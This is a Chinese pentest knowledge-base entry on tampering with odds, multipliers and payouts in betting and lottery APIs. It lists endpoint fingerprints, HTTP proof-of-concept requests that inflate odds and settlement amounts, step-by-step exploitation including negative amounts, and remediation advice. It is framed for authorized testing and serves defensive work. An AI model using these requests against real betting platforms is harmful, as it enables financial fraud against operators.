---
title: 下注/结算赔率与倍数篡改（资金面）
cve: 无（业务逻辑）
severity: critical
cvss: 9.0
product: 博彩/彩票投注接口
versions: 任意
ports: 80, 443
keywords: bet, odds, 赔率, 倍数, 结算, 篡改
entry: 下注体里改 odds/multiple
verified: false
sources: 公开资料整理（业务逻辑类，无 CVE）
---

## 指纹

```
/api/bet/create    {"odds":1.98,"amount":100,"issue":"2024110"}
/api/bet/settle    /api/lottery/bet   /api/game/bet
```

赔率/倍数本来由服务端按玩法算，若请求体里出现 `odds`、`multiple`、`rate`、`payout` 就是可篡改点。

## 前置条件

- 授权测试账号（小额余额）；能抓到下注请求。

## PoC

```http
### 1) 篡改赔率
POST /api/bet/create HTTP/1.1
Content-Type: application/json

{"issue":"2024110","amount":10,"odds":999,"selection":"home"}

### 2) 篡改倍数/结算金额
POST /api/bet/settle HTTP/1.1

{"betId":123,"payout":99999}
```

## 利用步骤

1. 正常下一注最小金额，记录服务端返回的 `odds` 与 `payout`（基线）。
2. 把 `odds` 改大重下一注：若回包里 `payout` 按请求的 odds 计算 ⇒ 命中。
3. 试结算接口改 `payout`/`amount`/`status`；只对自己的注单做。
4. 试负数/0（`amount:-10`）、超大倍数（`multiple:100`）看服务端校验。
5. 判定：**注单回包 + 结算后余额** 两者都按篡改值变化才算；证据留注单号。

## 修复与缓解

- 赔率/倍数/结算一律服务端按玩法与期号计算，请求体只接受 `issue`+`selection`+`amount`。
- 金额与赔率做上下限校验；结算幂等（注单唯一状态机）。
- 对账：每期开奖后核对注单赔率与系统赔率是否一致。

## 参考

- OWASP WSTG-BUSL-01；CWE-472。
